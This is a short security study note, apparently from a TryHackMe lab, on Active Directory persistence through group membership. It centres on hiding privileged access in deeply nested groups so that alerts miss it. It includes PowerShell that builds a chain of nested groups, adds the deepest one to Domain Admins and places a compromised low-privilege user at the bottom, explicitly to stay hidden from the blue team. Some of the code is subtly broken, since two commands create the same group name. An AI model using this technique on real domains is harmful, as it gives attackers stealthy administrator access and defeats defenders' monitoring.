
The simple addition of accounts to AD groups see: [[Active-Directory-Default-Security-Groups-Table]]. For secure, long term stability in persistence privilege groups are monitored more closely and receive additional security scrutiny. To persist through group membership:
-  IT Support group can be used to gain privileges such as force changing user passwords of non privileged users
	- Allows for compromisation creep spread through the userbase
- Groups that provide local administrator rights are often not monitored as closely as protected groups.
	- Used to return to compromise the domain again
- Groups with indirect privilege
	- Ownership over Group Policy Objects (GPOs)

## Nesting Persistence in Nested Grouped

In most organisations, there are a significant amount of recursive groups(a group that is member of another group), which provide more organised structure. Although this came come with itself own complexity creep and it does reduces the visibility of effective access. If Group X is a member of Y and Z, where X-A, X-B and X-C are a sub group of X, but the terminal or GUI output does not show the recursive group nesting of Y. We would have know or enumerate as either attacker or defender or system administrator that the group relationships and membership existed. Making alerts that set off that member was added to group X will not alert unless that alert also includes the **X and its subgroups**. Attackers can leverage this reduced visibility to perform persistence, focusing on subgrouping to access the environment.

This can be done repeatly create more nesting. Consider the contextual need or how it interelate to the structuing of the organisation for most stealth.

```powershell
# Create a new base group that will hde the People->IT OU
New-ADGroup -Path "OU=IT,OU=People,DC=$workgroup,DC=$domain,DC=$local" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
# Create a second group in People->Sale OU 
New-ADGroup -Path "OU=SALES,OU=People,DC=$workgroup,DC=$domain,DC=$local" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
# Add the first group to the second group
Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
# Repeat till nesting is atleast as deep enough that the Blue Team thinks that they have digging in the mines of Moria
# Add the most hidden in the nesting of groups to the Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup5"
# Add compromised low privileged user
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```


## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)